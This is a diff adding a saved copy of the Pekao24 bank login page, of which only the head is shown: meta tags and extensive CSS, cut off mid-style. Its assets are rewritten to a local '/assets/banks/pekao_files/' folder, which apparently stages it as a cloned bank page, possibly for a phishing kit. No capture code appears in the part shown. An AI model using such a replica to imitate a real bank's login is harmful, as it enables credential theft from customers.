@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://www.pekao24.pl/logowanie -->
+<html lang="pl">
+<head>
+    <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Pekao24 - Logowanie</title>
+    <meta name="description" content="Witaj na nowej stronie www.pekao24.pl">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="theme-color" content="#ac1419">
+    <meta name="robots" content="index, follow">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta property="og:url" content="https://www.pekao24.pl">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Pekao24">
+    <meta property="og:description" content="Witaj na nowej stronie www.pekao24.pl">
+    <meta property="og:image" content="https://www.pekao24.pl/assets/img/social/share.jpg">
+    <style>
+        .app-shell {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1;
+            transform: translateZ(0);
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+        }
+        .app-shell.app-shell-hide {
+            display: none;
+        }
+        .app-shell-header {
+            position: relative;
+            display: block;
+            height: 56px;
+            min-width: 320px;
+            box-sizing: content-box;
+            background-color: #ac1419;
+        }
+        .app-shell-header-wrapper {
+            display: flex;
+            flex-direction: row;
+            flex-shrink: 0;
+            height: 100%;
+            justify-content: space-between;
+            margin: 0 auto;
+            max-width: 1260px;
+            padding: 0 20px;
+        }
+        .app-shell-logo > svg {
+            width: 171px;
+            height: 56px;
+        }
+        .app-shell-content {
+            flex: 1 1 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .app-shell-content > .app-shell-rect-wrapper {
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .app-shell-rect-loader > rect {
+            fill: #d71920;
+            animation: opacity 1.5s ease-in-out infinite;
+        }
+        .app-shell-rect-loader > rect:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        .app-shell-rect-loader > rect:nth-child(3) {
+            animation-delay: 1s;
+        }
+        @keyframes opacity {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+        .app-shell-footer {
+            display: block;
+            min-width: 320px;
+            box-sizing: content-box;
+            background-color: #f4f4f4;
+        }
+        .app-shell-footer-section {
+            background-color: #f4f4f4;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 15px;
+        }
+        .app-shell-footer-wrapper {
+            color: #858585;
+            margin: 0 auto;
+            padding: 0 20px;
+            max-width: 1260px;
+        }
+        .app-shell-footer-navigation {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .app-shell-footer-navigation-group {
+            display: flex;
+            align-self: center;
+            list-style: none;
+            margin: 0 0 15px 0;
+            padding: 0;
+        }
+        @media (max-width: 767px) {
+            app-shell-footer-navigation-group li {
+                padding-right: 0;
+            }
+        }
+        @media (min-width: 768px) {
+            .app-shell-footer-navigation-group li {
+                padding-right: 48px;
+            }
+        }
+        @media (max-width: 767px) {
+            .app-shell-phone-numbers-group li {
+                width: 50%;
+            }
+        }
+        @media (max-width: 979px) {
+            .app-shell-footer-navigation-group {
+                width: 100%;
+            }
+        }
+        .app-shell-phone-number {
+            color: #2f3234;
+            font-weight: 900;
+            line-height: 26px;
+        }
+        @media (max-width: 767px) {
+            .app-shell-phone-number {
+                font-size: 18px;
+            }
+        }
+        @media (min-width: 768px) {
+            .app-shell-phone-number {
+                font-size: 22px;
+            }
+        }
+        .app-shell-links {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        @media (max-width: 767px) {
+            .app-shell-links {
+                display: flex;
+                flex-direction: column;
+                width: 50%;
+            }
+            .app-shell-links .app-shell-link {
+                padding-bottom: 10px;
+            }
+        }
+        .app-shell-link {
+            line-height: 21px;
+        }
+        @media (max-width: 767px) {
+            .app-shell-link {
+                font-size: 14px;
+            }
+        }
+        @media (min-width: 768px) {
+            .app-shell-link {
+                font-size: 16px;
+            }
+        }
+        .app-shell-bank-information {
+            padding-bottom: 15px;
+        }
+        .app-shell-footer-info-group {
+            font-size: 12px;
+            line-height: 14px;
+        }
+        .app-shell-definition-group {
+            display: flex;
+            padding-top: 20px;
+        }
+        @media (max-width: 767px) {
+            .app-shell-definition-group {
+                flex-direction: column;
+            }
+        }
+        .app-shell-codes {
+            flex-grow: 1;
+        }
+        @media (max-width: 767px) {
+            .app-shell-codes {
+                padding-bottom: 15px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="/assets/banks/pekao_files/42021020605265535651.css">
+    <style>[_nghost-tvb-c0]{display:block;min-width:320px;height:100%}.router-outlet[_ngcontent-tvb-c0]{height:100%;overflow:hidden}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c1]{display:block;position:absolute;left:0;right:0;top:0;z-index:1002;pointer-events:none}.connection-message[_ngcontent-tvb-c1]{display:flex;justify-content:center;align-items:center;text-align:center;height:25px;color:#fff;background-color:#f7981c}.connection-message[_ngcontent-tvb-c1]   .offline-mode[_ngcontent-tvb-c1]{display:block}.connection-message[_ngcontent-tvb-c1]   .online-mode[_ngcontent-tvb-c1]{display:none}.connection-message.is-online[_ngcontent-tvb-c1]{transition:all .2s ease-in-out;background-color:#39b54a}.connection-message.is-online[_ngcontent-tvb-c1]   .offline-mode[_ngcontent-tvb-c1]{display:none}.connection-message.is-online[_ngcontent-tvb-c1]   .online-mode[_ngcontent-tvb-c1]{display:block}.connection-message[_ngcontent-tvb-c1]   p[_ngcontent-tvb-c1]{margin:0;font-size:12px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}</style>
+    <meta property="og:image" content="https://www.pekao24.pl/assets/img/share.jpg">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#f9f9f9">
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.peopay-box[_ngcontent-tvb-c2]{position:absolute;bottom:400px;right:20px}@media (max-width:979px){.peopay-box[_ngcontent-tvb-c2]{bottom:255px}}@media (max-width:767px){.background-mini[_ngcontent-tvb-c2]{width:100%;height:100%;min-height:220px;background-image:url(img2.gif);background-size:100% auto;background-position:center}}.login-peopay-poster[_ngcontent-tvb-c2]{position:absolute;min-height:100%;top:0;right:-4px}.login-peopay-poster.peek-animation[_ngcontent-tvb-c2]{-webkit-animation:6s linear infinite peek-animation;animation:6s linear infinite peek-animation}.login-peopay-mobile-poster[_ngcontent-tvb-c2]{width:100%}.router-outlet-modal[_ngcontent-tvb-c2]{position:static;z-index:9999}@-webkit-keyframes peek-animation{100%,80%{right:-4px}85%,90%,95%{right:-6px}87%,93%{right:-10px}}@keyframes peek-animation{100%,80%{right:-4px}85%,90%,95%{right:-6px}87%,93%{right:-10px}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.space-after[_ngcontent-tvb-c2]:after{content:' '}.banner-error-action-button[_ngcontent-tvb-c2]   .button-tertiary[_ngcontent-tvb-c2]{width:183px;color:#fff;border-radius:4px;background-color:rgba(0,0,0,.3)}.banner-error-action-button[_ngcontent-tvb-c2]   .button-tertiary[_ngcontent-tvb-c2]:hover{color:#dbdbdb}@media (max-width:767px){.show-on-desktop[_ngcontent-tvb-c2]{display:none}}@media (min-width:768px){.show-on-mobile[_ngcontent-tvb-c2]{display:none}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.login-container[_ngcontent-tvb-c3]{display:flex;align-items:center;flex-direction:column;height:100%;justify-content:space-between;width:100%;-webkit-overflow-scrolling:touch;overflow:hidden auto;overflow-x:hidden;overflow-y:auto}@media (min-width:768px){.login-container[_ngcontent-tvb-c3]{background:url(img2.gif) center/cover no-repeat}}@media (min-width:768px) and (-webkit-min-device-pixel-ratio:2),(min-width:768px) and (min-resolution:192dpi){.login-container[_ngcontent-tvb-c3]{background-image:url(img2.gif)}}@media (min-width:980px) and (-webkit-min-device-pixel-ratio:2),(min-width:980px) and (min-resolution:192dpi){.login-container[_ngcontent-tvb-c3]{background-image:url(img2.gif)}}@media (min-width:1260px){.login-container[_ngcontent-tvb-c3]{background-image:url(/assets/banks/pekao_files/420210206052655413107.jpg)}}@media (min-width:1260px) and (-webkit-min-device-pixel-ratio:2),(min-width:1260px) and (min-resolution:192dpi){.login-container[_ngcontent-tvb-c3]{background-image:url(img2.gif)}}@media (min-width:1260px) and (-webkit-min-device-pixel-ratio:3),(min-width:1260px) and (-webkit-min-device-pixel-ratio:3.6458333333333335),(min-width:1260px) and (min-resolution:350dpi){.login-container[_ngcontent-tvb-c3]{background-image:url(img2.gif)}}.header[_ngcontent-tvb-c3]{background-color:#ac1419;height:56px;min-width:100vw;flex-shrink:0}.header-wrapper[_ngcontent-tvb-c3]{display:flex;flex-direction:row;flex-shrink:0;height:100%;justify-content:space-between;margin:0 auto;max-width:1260px;padding:0 20px}.account-action-group[_ngcontent-tvb-c3]{align-items:center;display:flex;flex-direction:row;height:56px}.account-label[_ngcontent-tvb-c3], .account-link[_ngcontent-tvb-c3]{color:#fff;font-weight:400}.account-label[_ngcontent-tvb-c3]{padding-right:20px;letter-spacing:1.09px;font-size:16px}.account-link[_ngcontent-tvb-c3]{font-size:12px;letter-spacing:1.5px;text-transform:uppercase}.button.button-primary.button-account[_ngcontent-tvb-c3]{background-color:#f4f4f4;color:#d71920;letter-spacing:1.09px}.button.button-primary.button-account[_ngcontent-tvb-c3]:focus, .button.button-primary.button-account[_ngcontent-tvb-c3]:hover{background-color:#dbdbdb;color:#ac1419}.logo[_ngcontent-tvb-c3]{height:56px;width:171px}.content[_ngcontent-tvb-c3]{display:flex;align-items:center;flex-direction:column;flex-grow:1;flex-shrink:0;justify-content:center;width:100%}.login-container-wrapper[_ngcontent-tvb-c3]{margin:20px auto;position:relative;max-width:1260px}@media (max-width:767px){.login-container-wrapper[_ngcontent-tvb-c3]{height:100%;margin:0;width:100%}.background-mini[_ngcontent-tvb-c3]{width:100%;height:100%;min-height:220px;background-image:url(img2.gif);background-size:100% auto;background-position:center}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.space-after[_ngcontent-tvb-c3]:after{content:' '}.banner-error-action-button[_ngcontent-tvb-c3]   .button-tertiary[_ngcontent-tvb-c3]{width:183px;color:#fff;border-radius:4px;background-color:rgba(0,0,0,.3)}.banner-error-action-button[_ngcontent-tvb-c3]   .button-tertiary[_ngcontent-tvb-c3]:hover{color:#dbdbdb}@media (max-width:767px){.show-on-desktop[_ngcontent-tvb-c3]{display:none}}@media (min-width:768px){.show-on-mobile[_ngcontent-tvb-c3]{display:none}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c16]{position:absolute;top:0;left:0;right:0;transition:top .2s ease-in-out;overflow-y:auto;scrollbar-width:none}[_nghost-tvb-c16]::-webkit-scrollbar{display:none}@media (max-width:979px){[_nghost-tvb-c16]{width:100%}}.snackbar-outlet[_ngcontent-tvb-c16]{display:flex;flex-direction:column}@media (min-width:980px){.over-modal[_nghost-tvb-c16]   .snackbar-outlet[_ngcontent-tvb-c16]{margin-left:0;padding:0 20px}.snackbar-outlet[_ngcontent-tvb-c16]{align-items:flex-start;margin:0 auto;padding:0 20px;width:980px}.snackbar-outlet[_ngcontent-tvb-c16] > pekao-snackbar[_ngcontent-tvb-c16]{max-width:100%}}@media (min-width:1260px){.snackbar-outlet[_ngcontent-tvb-c16]{width:1260px}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c17]{width:100%;min-width:100vw}.footer[_ngcontent-tvb-c17]{background-color:#f4f4f4}.footer-section[_ngcontent-tvb-c17]{background-color:#f4f4f4;border-top:1px solid #dbdbdb;padding-top:15px}.footer-section.bank-information[_ngcontent-tvb-c17]{padding-bottom:15px}.footer-wrapper[_ngcontent-tvb-c17]{color:#858585;margin:0 auto;padding:0 20px;max-width:1260px}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]{display:flex;flex-wrap:wrap}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]{display:flex;align-self:center;margin-bottom:15px}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   pekao-button[_ngcontent-tvb-c17]{padding-right:48px}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button[_ngcontent-tvb-c17]{color:#858585;font-size:14px;font-weight:400;line-height:21px;text-transform:none;padding:0}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button[_ngcontent-tvb-c17]:focus{border:transparent}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button[_ngcontent-tvb-c17]:hover{color:#2f3234}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button.phone-number[_ngcontent-tvb-c17]{font-size:18px;color:#2f3234;font-weight:900;line-height:26px}@media (min-width:768px){.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button[_ngcontent-tvb-c17]{font-size:16px}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .button.phone-number[_ngcontent-tvb-c17]{font-size:22px}}@media (max-width:979px){.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group.phone-numbers-group[_ngcontent-tvb-c17]{width:100%}}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]{font-size:12px;line-height:14px}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]   .definition-group[_ngcontent-tvb-c17]{display:flex;padding-top:20px}@media (max-width:767px){.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]{width:100%}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   pekao-button[_ngcontent-tvb-c17]{padding-right:0}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .links[_ngcontent-tvb-c17]{display:flex;flex-direction:column}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group[_ngcontent-tvb-c17]   .links[_ngcontent-tvb-c17]   pekao-button[_ngcontent-tvb-c17]:first-child{padding-bottom:10px}.footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group.links-group[_ngcontent-tvb-c17]   .links[_ngcontent-tvb-c17], .footer-wrapper.footer-navigation[_ngcontent-tvb-c17]   .footer-navigation-group.phone-numbers-group[_ngcontent-tvb-c17]   pekao-button[_ngcontent-tvb-c17]{width:50%}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]   .definition-group[_ngcontent-tvb-c17]{flex-direction:column}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]   .codes[_ngcontent-tvb-c17]{padding-bottom:15px}}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]   .codes[_ngcontent-tvb-c17]{flex-grow:1}.footer-wrapper.footer-info-group[_ngcontent-tvb-c17]   .padding-right[_ngcontent-tvb-c17]{padding-right:25px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.space-after[_ngcontent-tvb-c17]:after{content:' '}.banner-error-action-button[_ngcontent-tvb-c17]   .button-tertiary[_ngcontent-tvb-c17]{width:183px;color:#fff;border-radius:4px;background-color:rgba(0,0,0,.3)}.banner-error-action-button[_ngcontent-tvb-c17]   .button-tertiary[_ngcontent-tvb-c17]:hover{color:#dbdbdb}@media (max-width:767px){.show-on-desktop[_ngcontent-tvb-c17]{display:none}}@media (min-width:768px){.show-on-mobile[_ngcontent-tvb-c17]{display:none}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c20]     a.button{display:flex;text-decoration:none;align-items:center;justify-content:center}[_nghost-tvb-c20]     .button{-webkit-appearance:none;-moz-appearance:none;appearance:none;height:50px;max-width:414px;width:100%;padding:0 20px;box-sizing:border-box;border:1px solid #d71920;outline:0;font-family:Lato,sans-serif;font-size:12px;font-weight:600;color:#fff;text-align:center;text-transform:uppercase;background-color:#d71920;transition:.2s ease-in-out;cursor:pointer;border-radius:4px}@media (hover:hover){[_nghost-tvb-c20]     .button:hover{border-color:#ac141a;background-color:#ac141a}[_nghost-tvb-c20]     .button.button-secondary:hover{border-color:#eee;color:#ac1419;background-color:#eee}}[_nghost-tvb-c20]     .button:focus{border-color:#b4b4b4;background-color:#ac141a}[_nghost-tvb-c20]     .button[disabled]{background-color:#b4b4b4;border:none;color:#eee;cursor:default}[_nghost-tvb-c20]     .button.button-small{height:30px}[_nghost-tvb-c20]     .button.button-secondary{color:#d71920;background-color:#f4f4f4;border:1px solid #f4f4f4}[_nghost-tvb-c20]     .button.button-secondary:focus{border-color:#b4b4b4;color:#ac1419;background-color:#eee}[_nghost-tvb-c20]     .button.button-secondary[disabled]{color:#b4b4b4;background-color:#eee}[_nghost-tvb-c20]     .button.button-no-border{border:none}[_nghost-tvb-c20]     .button.button-lowercase{text-transform:lowercase}[_nghost-tvb-c20]     .button.button-tertiary, [_nghost-tvb-c20]     .button.button-tertiary-white{height:auto;width:auto;padding:10px 0;border:none;border-radius:0;display:inline-block;color:#d71920;background-color:transparent;transition:color .2s ease-in-out;position:relative}[_nghost-tvb-c20]     .button.button-tertiary .icon, [_nghost-tvb-c20]     .button.button-tertiary-white .icon{position:relative;margin-right:9px;font-size:16px}[_nghost-tvb-c20]     .button.button-tertiary.icon-on-right .icon, [_nghost-tvb-c20]     .button.icon-on-right.button-tertiary-white .icon{margin-right:0;margin-left:9px}[_nghost-tvb-c20]     .button.button-tertiary-white:disabled, [_nghost-tvb-c20]     .button.button-tertiary:disabled{opacity:.5}@media (hover:hover){[_nghost-tvb-c20]     .button.button-tertiary-white:not(:disabled):hover, [_nghost-tvb-c20]     .button.button-tertiary:not(:disabled):hover{color:#ac141a}}[_nghost-tvb-c20]     .button.button-tertiary-white:focus, [_nghost-tvb-c20]     .button.button-tertiary:focus{color:#ac1419}[_nghost-tvb-c20]     .button.button-tertiary-white{color:#fff}@media (hover:hover){[_nghost-tvb-c20]     .button.button-tertiary-white:not(:disabled):hover{color:#fff}}[_nghost-tvb-c20]     .button.button-tertiary-white:disabled{opacity:.6}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c5]{display:block}.number-client-or-name-pekao-field[_ngcontent-tvb-c5]   .pekao-field-input[_ngcontent-tvb-c5]{border-right:0;border-top-right-radius:0;border-bottom-right-radius:0}.number-client-or-name-pekao-field[_ngcontent-tvb-c5]   .pekao-field-input.ng-touched.ng-invalid[_ngcontent-tvb-c5]{border-right:0}.main-action-group[_ngcontent-tvb-c5]{padding:20px 0;text-align:right}.main-action-group[_ngcontent-tvb-c5]   .button[_ngcontent-tvb-c5]{max-width:171px}.account-action-group[_ngcontent-tvb-c5]{display:flex;justify-content:space-between}.account-action-group[_ngcontent-tvb-c5]   .account-link[_ngcontent-tvb-c5]{font-size:12px;letter-spacing:1.5px;text-transform:uppercase;padding:0}@media (max-width:767px){.account-action-group[_ngcontent-tvb-c5]{padding-top:10px}.login-container-footer[_ngcontent-tvb-c5]{border-top:1px solid #dbdbdb;margin-top:15px;padding-top:20px}}.underline[_ngcontent-tvb-c5]{text-decoration:underline}.keyboard-button[_ngcontent-tvb-c5]:disabled{background:#eee;border-color:#dbdbdb;color:#b4b4b4;cursor:not-allowed}.keyboard-button[_ngcontent-tvb-c5]:disabled:focus{box-shadow:none}@media (hover:hover){.keyboard-button[_ngcontent-tvb-c5]:disabled:hover{box-shadow:none}}[_nghost-tvb-c5]     .invalid .no-left-border.field-button.show-on-desktop{border-left:none}[_nghost-tvb-c5]     .login-customer-wrapper .login-container-content{min-height:555px;z-index:2}[_nghost-tvb-c5]     .login-customer-wrapper .login-container-content .login-container-form{min-height:385px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.space-after[_ngcontent-tvb-c5]:after{content:' '}.banner-error-action-button[_ngcontent-tvb-c5]   .button-tertiary[_ngcontent-tvb-c5]{width:183px;color:#fff;border-radius:4px;background-color:rgba(0,0,0,.3)}.banner-error-action-button[_ngcontent-tvb-c5]   .button-tertiary[_ngcontent-tvb-c5]:hover{color:#dbdbdb}@media (max-width:767px){.show-on-desktop[_ngcontent-tvb-c5]{display:none}}@media (min-width:768px){.show-on-mobile[_ngcontent-tvb-c5]{display:none}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c15]{background-color:#dbdbdb;display:block;opacity:1;position:relative;position:-webkit-sticky;position:sticky;bottom:0;z-index:2;left:0;width:100%;flex-shrink:0;box-shadow:0 -10px 10px 0 rgba(0,0,0,.2);padding:20px 0}.hide-cookies[_nghost-tvb-c15]{display:none}.cookies-wrapper[_ngcontent-tvb-c15]{display:flex;justify-content:space-between;align-items:center;margin:0 auto;padding:0 20px;max-width:1260px}.cookies-title[_ngcontent-tvb-c15]{color:#2f3234;font-size:16px;font-weight:900;line-height:1;padding-bottom:12px}@media (min-width:768px){.cookies-title[_ngcontent-tvb-c15]{display:none}}.cookies-txt[_ngcontent-tvb-c15]{color:#2f3234;font-size:14px;font-weight:400;line-height:1.5}.link[_ngcontent-tvb-c15]{color:#d71920}.link[_ngcontent-tvb-c15]:hover{color:#ac1419}.cookies-button[_ngcontent-tvb-c15]{margin-left:15px}.cookies-button[_ngcontent-tvb-c15]   .cookies-close-icon[_ngcontent-tvb-c15]{font-size:20px;line-height:1}</style>
+    <style>[_nghost-tvb-c24]     svg{width:1em;height:1em;display:inline-block;vertical-align:-.2em}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}@media (max-width:767px){.login-container-wrapper[_ngcontent-tvb-c21], [_nghost-tvb-c21]{height:100%}}@media (min-width:768px){.show-on-mobile[_ngcontent-tvb-c21]{display:none}}.login-container-content[_ngcontent-tvb-c21]{position:relative;display:flex;flex-direction:column;width:460px;height:auto;max-height:100%;min-height:390px;margin:0 auto;padding:24px 40px 20px;overflow:auto;background-color:#fff;box-shadow:0 0 10px 0 rgba(0,0,0,.2);border:1px solid #dbdbdb}@media (max-width:767px){.login-container-content[_ngcontent-tvb-c21]{margin:0 auto;width:100%;height:100%;padding-right:20px;padding-left:20px;border-width:1px 0}}@media (min-width:768px){.login-container-content.extended[_ngcontent-tvb-c21]{width:800px}.login-container-content[_ngcontent-tvb-c21]   .login-container-form[_ngcontent-tvb-c21]{flex:1 0 auto}}.login-container-header[_ngcontent-tvb-c21]{display:flex;flex-direction:column;justify-content:space-between;margin-bottom:27px}.login-container-header[_ngcontent-tvb-c21]   .title-and-language-wrapper[_ngcontent-tvb-c21]{display:flex;justify-content:space-between}.login-container-header-title[_ngcontent-tvb-c21]{color:#2f3234;font-size:22px;font-weight:400;line-height:46px}.login-container-footer[_ngcontent-tvb-c21]{display:flex;justify-content:space-between;align-items:center;min-height:50px}.login-container-footer[_ngcontent-tvb-c21]:empty{min-height:0}.no-margin[_ngcontent-tvb-c21]{margin:0}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c22]{position:relative;display:inline-block;width:100%}.no-right-border[_nghost-tvb-c22]   .fake-input[_ngcontent-tvb-c22], .no-right-border[_nghost-tvb-c22]   .readonly[_ngcontent-tvb-c22], .no-right-border[_nghost-tvb-c22]     input[type=email], .no-right-border[_nghost-tvb-c22]     input[type=number], .no-right-border[_nghost-tvb-c22]     input[type=password], .no-right-border[_nghost-tvb-c22]     input[type=search], .no-right-border[_nghost-tvb-c22]     input[type=tel], .no-right-border[_nghost-tvb-c22]     input[type=text], .no-right-border[_nghost-tvb-c22]     pekao-masked-input-field, .no-right-border[_nghost-tvb-c22]     pekao-select, .no-right-border[_nghost-tvb-c22]     